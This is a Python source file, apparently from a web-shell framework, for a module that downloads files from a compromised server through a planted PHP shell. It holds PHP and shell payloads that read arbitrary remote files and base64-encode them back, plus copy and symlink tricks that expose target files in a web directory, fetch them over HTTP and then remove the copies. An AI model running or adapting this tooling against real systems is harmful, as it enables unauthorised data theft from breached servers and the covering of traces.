'''
Created on 24/ago/2011

@author: norby
'''
from core.moduleprobeall import ModuleProbeAll
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from core.vector import VectorList, Vector as V
from core.savedargparse import SavedArgumentParser as ArgumentParser
from core.utils import randstr
import os

WARN_NO_SUCH_FILE = 'No such file or permission denied'

class Download(ModuleProbeAll):
    '''Download binary/ascii files from target filesystem'''


        
    def _init_vectors(self):

        self.vectors = VectorList([
            V('shell.php', 'file', "print(@base64_encode(implode('', file('$rpath'))));"),
            V('shell.php', 'fread', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
            V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('$rpath')));"),
            V('shell.sh',  "base64", "base64 -w 0 $rpath"),
            V('shell.php', "copy", "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);"),
            V('shell.php',  "symlink", "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
        ])
    
        self.support_vectors = VectorList([
            V('file.check',  "check_readable", "$rpath read".split(' ')),
            V('file.upload2web', 'upload2web', '$rand -content 1'.split(' ')),
            V('file.rm', 'remove', '$rpath'),
            V('file.check', 'md5', '$rpath md5'.split(' ')),
        ])
    
    def _init_args(self):
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('lpath')
        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
        
    def _prepare_probe(self):
        self.transfer_dir = None
        self.lastreadfile = ''

    def _prepare_vector(self):
        
        remote_path = self.args['rpath']
        self.args_formats['rpath'] = self.args['rpath']
        
        # First check remote file existance
        
        if not self.support_vectors.get('check_readable').execute(self.modhandler, {'rpath' : remote_path}):
            raise ProbeException(self.name, '\'%s\' %s' % (remote_path, WARN_NO_SUCH_FILE))
         
        # Vectory copy and symlink needs to search a writable directory before
        
        if self.current_vector.name in ( 'copy', 'symlink' ):

                filename_temp = randstr() + remote_path.split('/').pop();
                upload_test = self.support_vectors.get('upload2web').execute(self.modhandler, { 'rand' : filename_temp})

                if not upload_test:
                    raise ExecutionException(self.current_vector.name,'No transfer url dir found')

                self.args_formats['downloadpath'] = upload_test[0]
                self.args['url'] = upload_test[1]

                self.support_vectors.get('remove').execute(self.modhandler, { 'path' : self.args_formats['downloadpath'] })

            

    def _execute_vector(self):
        
        output = self.current_vector.execute(self.modhandler, self.args_formats)
        
        if self.current_vector.name in ('copy', 'symlink'):

            if self.support_vectors.get('check_readable').execute(self.modhandler, {'rpath' : self.args_formats['downloadpath']}):
                self._result = Request(self.args['url']).read()
                # Force deleting. Does not check existance, because broken links returns False
            
            self.support_vectors.get('remove').execute(self.modhandler, {'rpath' : self.args_formats['downloadpath']})
            
        else:
            # All others encode data in b64 format
            
            try:
                self._result = b64decode(output)
            except TypeError:
                raise ExecutionException(self.current_vector.name,"Error, unexpected file content")


    def _verify_execution(self):

        remote_path = self.args['rpath']
        local_path = self.args['lpath']

        try:
            f = open(local_path,'wb')
            f.write(self._result)
            f.close()
        except Exception, e:
            raise ProbeException(self.name, 'Writing %s' % (e))

        response_md5 = md5(self._result).hexdigest()
        remote_md5 = self.support_vectors.get('md5').execute(self.modhandler, {'rpath' : self.args_formats['rpath']})

        # Consider as probe failed only MD5 mismatch
        if not remote_md5 == response_md5:
            
            if self.current_vector.name in ('copy', 'symlink') and not self.args_formats['downloadpath'].endswith('.html') and not self.args_formats['downloadpath'].endswith('.htm'):
                self.mprint("Transferred with '%s', rename as downloadable type as '.html' and retry" % (self.args['url']))

            self.mprint('MD5 hash of \'%s\' file mismatch, file corrupt' % ( local_path))
            raise ExecutionException(self.current_vector.name, 'file corrupt')
        
        elif not remote_md5:
            self.mprint('MD5 check failed')
        
        raise ProbeSucceed(self.name, 'File downloaded to \'%s\'.' % (local_path))
    
    
    
    def _output_result(self):
        # Not convert self._result to self._output (no output prints)
        self._output = ''
    
